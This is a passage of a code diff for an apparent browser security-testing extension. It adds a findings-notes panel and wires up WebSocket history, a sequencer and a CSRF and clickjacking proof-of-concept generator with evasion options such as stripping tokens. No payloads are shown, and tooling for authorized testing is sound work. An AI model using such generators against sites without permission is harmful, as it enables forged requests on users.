+  const list = document.getElementById("notes-list");
+  const empty = document.getElementById("notes-empty");
+  list.replaceChildren();
+
+  let items = [...notes];
+  if (notesFilterSev) items = items.filter(n => n.severity === notesFilterSev);
+  if (notesFilterHost) items = items.filter(n => n.host === notesFilterHost);
+  if (notesFilterText) {
+    const q = notesFilterText.toLowerCase();
+    items = items.filter(n => (n.title || "").toLowerCase().includes(q) || (n.body || "").toLowerCase().includes(q) || (n.url || "").toLowerCase().includes(q) || (n.host || "").toLowerCase().includes(q));
+  }
+
+  if (!items.length) { empty.classList.remove("hidden"); return; }
+  empty.classList.add("hidden");
+
+  // Populate host filter
+  const hostSel = document.getElementById("notes-flt-host");
+  const existingHosts = new Set([...hostSel.options].map(o => o.value));
+  for (const n of notes) {
+    if (n.host && !existingHosts.has(n.host)) {
+      const o = el("option"); o.value = n.host; o.textContent = n.host;
+      hostSel.appendChild(o); existingHosts.add(n.host);
+    }
+  }
+
+  for (const n of items) {
+    const card = el("div", "note-card");
+    const header = el("div", "note-header");
+    header.appendChild(txt("span", "note-title", n.title));
+    header.appendChild(txt("span", `note-sev note-sev-${n.severity}`, n.severity));
+    card.appendChild(header);
+    const meta = el("div", "note-meta");
+    const ts = new Date(n.time);
+    meta.textContent = `${n.host || "no host"} \u2014 ${ts.toLocaleDateString()} ${ts.toLocaleTimeString()}`;
+    card.appendChild(meta);
+    if (n.body) card.appendChild(txt("div", "note-body", n.body));
+    if (n.url) card.appendChild(txt("div", "note-url", n.url));
+    const actions = el("div", "note-actions");
+    const btnEdit = txt("button", "btn btn-xs btn-ghost", "\u270E");
+    const btnDel = txt("button", "btn btn-xs btn-danger", "\u2717");
+    btnEdit.addEventListener("click", () => notesStartEdit(n));
+    btnDel.addEventListener("click", () => notesDelete(n.id));
+    ap(actions, btnEdit, btnDel); card.appendChild(actions);
+    list.appendChild(card);
+  }
+}
+
+function notesStartEdit(note) {
+  notesEditingId = note.id;
+  document.getElementById("notes-title").value = note.title;
+  document.getElementById("notes-sev").value = note.severity;
+  document.getElementById("notes-host").value = note.host;
+  document.getElementById("notes-url").value = note.url;
+  document.getElementById("notes-body").value = note.body;
+  document.getElementById("notes-form").classList.remove("hidden");
+  document.getElementById("notes-form-save").textContent = "Update";
+}
+
+function notesSaveForm() {
+  const title = document.getElementById("notes-title").value.trim();
+  const severity = document.getElementById("notes-sev").value;
+  const host = document.getElementById("notes-host").value.trim();
+  const url = document.getElementById("notes-url").value.trim();
+  const body = document.getElementById("notes-body").value;
+  if (!title) { document.getElementById("notes-form-status").textContent = "Title required"; return; }
+  if (notesEditingId) {
+    const note = notes.find(n => n.id === notesEditingId);
+    if (note) { note.title = title; note.severity = severity; note.host = host; note.url = url; note.body = body; }
+    notesEditingId = null;
+  } else {
+    notesAdd({ title, severity, host, url, body });
+  }
+  notesCancelForm(); notesRender(); notesSave();
+}
+
+function notesCancelForm() {
+  notesEditingId = null;
+  document.getElementById("notes-form").classList.add("hidden");
+  document.getElementById("notes-title").value = "";
+  document.getElementById("notes-body").value = "";
+  document.getElementById("notes-url").value = "";
+  document.getElementById("notes-host").value = "";
+  document.getElementById("notes-form-save").textContent = "Save";
+}
+
+function notesFromEntry(entry) {
+  let host = "";
+  try { host = new URL(entry.url).hostname; } catch {}
+  document.getElementById("notes-title").value = `${entry.method} ${entry.url}`;
+  document.getElementById("notes-host").value = host;
+  document.getElementById("notes-url").value = entry.url || "";
+  document.getElementById("notes-sev").value = "info";
+  document.getElementById("notes-body").value = "";
+  document.getElementById("notes-form").classList.remove("hidden");
+  document.getElementById("notes-form-save").textContent = "Save";
+  notesEditingId = null;
+  showTab("notes");
+}
+
+function notesSave() { chrome.storage.local.set({ voidNotes: notes }); }
+
+async function notesLoad() {
+  const stored = await new Promise(r => chrome.storage.local.get("voidNotes", r));
+  if (stored.voidNotes) {
+    notes = stored.voidNotes;
+    notesNextId = notes.reduce((max, n) => Math.max(max, n.id), 0) + 1;
+    setBadge("bdg-notes", notes.length);
+  }
+}
+
+function notesExport() {
+  if (!notes.length) return;
+  let md = "# Void Extension \u2014 Notes\n\n";
+  const byHost = {};
+  for (const n of notes) { const h = n.host || "General"; (byHost[h] = byHost[h] || []).push(n); }
+  for (const [host, items] of Object.entries(byHost)) {
+    md += `## ${host}\n\n`;
+    for (const n of items) {
+      md += `### [${n.severity.toUpperCase()}] ${n.title}\n`;
+      if (n.url) md += `**URL:** ${n.url}\n`;
+      md += `**Date:** ${new Date(n.time).toISOString()}\n\n`;
+      if (n.body) md += `${n.body}\n\n`;
+      md += "---\n\n";
+    }
+  }
+  const blob = new Blob([md], { type: "text/markdown" });
+  const a = el("a"); a.href = URL.createObjectURL(blob);
+  a.download = `void-notes-${new Date().toISOString().slice(0, 10)}.md`;
+  a.click(); URL.revokeObjectURL(a.href);
 }
 
 // ═══════════════════════════ COMPARER ════════════════════════════════════
@@ -5406,6 +6196,117 @@ document.addEventListener("DOMContentLoaded", () => {
       if (!epDetailEntry) return;
       const h = historyData.find(he => he.url === epDetailEntry.url) || epDetailEntry;
       cmpSendTo("right", h);
+    });
+  });
+
+  // ── WebSocket History ────────────────────────────────────────────────────
+  initBlock("ws", () => {
+    document.getElementById("ws-filter").addEventListener("input", e => { wsFilterText = e.target.value; renderWsHistory(); });
+    document.getElementById("ws-flt-dir").addEventListener("change", e => { wsFilterDir = e.target.value; renderWsHistory(); });
+    document.getElementById("ws-flt-type").addEventListener("change", e => { wsFilterType = e.target.value; renderWsHistory(); });
+    document.getElementById("ws-flt-conn").addEventListener("change", e => { wsFilterConn = e.target.value; renderWsHistory(); });
+    document.getElementById("ws-clear").addEventListener("click", () => { wsFrames = []; wsConnections = {}; renderWsHistory(); setBadge("bdg-ws", 0); });
+    document.getElementById("ws-detail-close").addEventListener("click", wsCloseDetail);
+    document.querySelectorAll("#ws-table .hist-th-sortable").forEach(th => {
+      th.addEventListener("click", () => {
+        const key = th.dataset.wssort;
+        if (wsSortKey === key) wsSortAsc = !wsSortAsc; else { wsSortKey = key; wsSortAsc = true; }
+        renderWsHistory();
+      });
+    });
+    (function() {
+      const handle = document.getElementById("ws-resizer");
+      const left = document.getElementById("ws-split-left");
+      let dragging = false, startX = 0, startW = 0;
+      handle.addEventListener("mousedown", e => { dragging = true; startX = e.clientX; startW = left.getBoundingClientRect().width; document.body.style.userSelect = "none"; document.body.style.cursor = "col-resize"; });
+      document.addEventListener("mousemove", e => { if (!dragging) return; left.style.flex = "none"; left.style.width = Math.max(200, startW + e.clientX - startX) + "px"; });
+      document.addEventListener("mouseup", () => { if (!dragging) return; dragging = false; document.body.style.userSelect = ""; document.body.style.cursor = ""; });
+    })();
+    document.getElementById("ws-detail-cmp-l").addEventListener("click", () => {
+      if (!wsDetailFrame) return;
+      cmpSendTo("left", { method: "WS", url: wsDetailFrame.url, host: "", path: "", headers: {}, body: wsDetailFrame.data, status: null, respHeaders: {}, respBody: "" });
+    });
+    document.getElementById("ws-detail-cmp-r").addEventListener("click", () => {
+      if (!wsDetailFrame) return;
+      cmpSendTo("right", { method: "WS", url: wsDetailFrame.url, host: "", path: "", headers: {}, body: wsDetailFrame.data, status: null, respHeaders: {}, respBody: "" });
+    });
+  });
+
+  // ── PoC Generator ───────────────────────────────────────────────────
+  initBlock("poc", () => {
+    // Sub-tab switching
+    document.querySelectorAll(".poc-sub-bar .sub-tab[data-pocsub]").forEach(t => {
+      t.addEventListener("click", () => {
+        document.querySelectorAll(".poc-sub-bar .sub-tab").forEach(s => s.classList.remove("active"));
+        t.classList.add("active");
+        document.querySelectorAll(".poc-sub-panel").forEach(p => { p.classList.remove("active"); p.classList.add("hidden"); });
+        const panel = document.getElementById("poc-" + t.dataset.pocsub);
+        panel.classList.add("active"); panel.classList.remove("hidden");
+      });
+    });
+
+    // CSRF
+    document.getElementById("poc-csrf-generate").addEventListener("click", pocCsrfGenerate);
+    document.getElementById("poc-csrf-copy").addEventListener("click", () => pocCopy("poc-csrf-code"));
+    document.getElementById("poc-csrf-download").addEventListener("click", () => pocDownload("poc-csrf-code", "csrf-poc.html"));
+    // Re-generate on technique/evasion change
+    document.getElementById("poc-csrf-technique").addEventListener("change", pocCsrfGenerate);
+    ["poc-csrf-autosubmit", "poc-csrf-no-referrer", "poc-csrf-strip-token", "poc-csrf-sandbox"].forEach(id => {
+      document.getElementById(id).addEventListener("change", pocCsrfGenerate);
+    });
+
+    // Clickjacking
+    document.getElementById("poc-cj-generate").addEventListener("click", pocCjGenerate);
+    document.getElementById("poc-cj-copy").addEventListener("click", () => pocCopy("poc-cj-code"));
+    document.getElementById("poc-cj-download").addEventListener("click", () => pocDownload("poc-cj-code", "clickjacking-poc.html"));
+    // Show/hide step 2 for multistep
+    document.getElementById("poc-cj-technique").addEventListener("change", () => {
+      document.getElementById("poc-cj-step2").classList.toggle("hidden", document.getElementById("poc-cj-technique").value !== "multistep");
+    });
+
+    // → PoC buttons from all detail panes
+    document.getElementById("hist-detail-poc").addEventListener("click", () => { if (histDetailEntry) pocLoadEntry(histDetailEntry); });
+    document.getElementById("log-detail-poc").addEventListener("click", () => { if (logDetailEntry) pocLoadEntry(logDetailEntry); });
+    document.getElementById("sens-detail-poc").addEventListener("click", () => { if (sensDetailEntry) pocLoadEntry(sensDetailEntry); });
+    document.getElementById("tgt-detail-poc").addEventListener("click", () => { if (tgtDetailEntry) pocLoadEntry(tgtDetailEntry); });
+    document.getElementById("ep-detail-poc").addEventListener("click", () => {
+      if (!epDetailEntry) return;
+      const h = historyData.find(he => he.url === epDetailEntry.url) || epDetailEntry;
+      pocLoadEntry(h);
+    });
+    document.getElementById("intr-detail-poc").addEventListener("click", () => {
+      const sel = document.querySelector("#intr-results tr.hist-selected");
+      if (sel && sel._intrResult) pocLoadEntry(sel._intrResult);
+    });
+  });
+
+  // ── Sequencer ──────────────────────────────────────────────────────────
+  initBlock("sequencer", () => {
+    document.getElementById("seq-start").addEventListener("click", seqStartCollection);
+    document.getElementById("seq-stop").addEventListener("click", seqStopCollection);
+    document.getElementById("seq-from-hist").addEventListener("click", seqFromHistory);
+    document.getElementById("seq-export").addEventListener("click", seqExport);
+  });
+
+  // ── Notes ──────────────────────────────────────────────────────────────
+  initBlock("notes", () => {
+    notesLoad();
+    document.getElementById("notes-filter").addEventListener("input", e => { notesFilterText = e.target.value; notesRender(); });
+    document.getElementById("notes-flt-sev").addEventListener("change", e => { notesFilterSev = e.target.value; notesRender(); });
+    document.getElementById("notes-flt-host").addEventListener("change", e => { notesFilterHost = e.target.value; notesRender(); });
+    document.getElementById("notes-add").addEventListener("click", () => { notesCancelForm(); document.getElementById("notes-form").classList.remove("hidden"); });
+    document.getElementById("notes-form-save").addEventListener("click", notesSaveForm);
+    document.getElementById("notes-form-cancel").addEventListener("click", notesCancelForm);
+    document.getElementById("notes-export").addEventListener("click", notesExport);
+    document.getElementById("notes-clear").addEventListener("click", () => { notes = []; notesRender(); notesSave(); setBadge("bdg-notes", 0); });
+    document.getElementById("hist-detail-notes").addEventListener("click", () => { if (histDetailEntry) notesFromEntry(histDetailEntry); });
+    document.getElementById("log-detail-notes").addEventListener("click", () => { if (logDetailEntry) notesFromEntry(logDetailEntry); });
+    document.getElementById("sens-detail-notes").addEventListener("click", () => { if (sensDetailEntry) notesFromEntry(sensDetailEntry); });
+    document.getElementById("tgt-detail-notes").addEventListener("click", () => { if (tgtDetailEntry) notesFromEntry(tgtDetailEntry); });
+    document.getElementById("ep-detail-notes").addEventListener("click", () => {
+      if (!epDetailEntry) return;
+      const h = historyData.find(he => he.url === epDetailEntry.url) || epDetailEntry;
+      notesFromEntry(h);
     });
   });
 
